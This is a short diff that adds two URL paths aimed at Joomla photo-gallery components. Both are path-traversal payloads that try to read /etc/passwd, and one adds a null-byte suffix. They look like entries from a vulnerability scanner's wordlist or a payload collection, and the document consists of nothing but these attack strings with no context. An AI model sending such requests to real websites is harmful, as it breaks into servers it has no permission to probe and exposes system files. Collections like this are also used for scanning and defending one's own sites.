@@ -1,0 +1,2 @@
+/index.php?option=com_omphotogallery&controller=../../../../../../../../../etc/passwd
+/index.php?option=com_photobattle&view=../../../../../../../../../../etc/passwd%00
